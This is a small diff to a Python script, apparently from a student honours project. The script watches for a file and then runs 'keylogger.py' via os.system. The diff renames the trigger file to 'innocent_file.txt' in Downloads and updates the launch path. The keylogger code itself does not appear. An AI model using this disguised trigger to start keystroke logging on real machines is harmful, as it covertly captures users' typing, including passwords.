@@ -1,6 +1,6 @@
 import os, time
 
-spath = ['./keylogger.py']
+spath = ['/home/gavin/Downloads/innocent_file.txt']
 
 def doesFileExist(spath):
     return os.path.exists(spath)
@@ -18,7 +18,7 @@ def timer():
             
             print ('Yes',i, ' exists')
             
-            os.system("python H:\year 4\gitrep\Honours\HonoursProject\Honours code\keylogger.py")
+            os.system("python3 /home/gavin/Desktop/Python/HonoursProject/Honours\ code/keylogger.py")
             
         else:
             
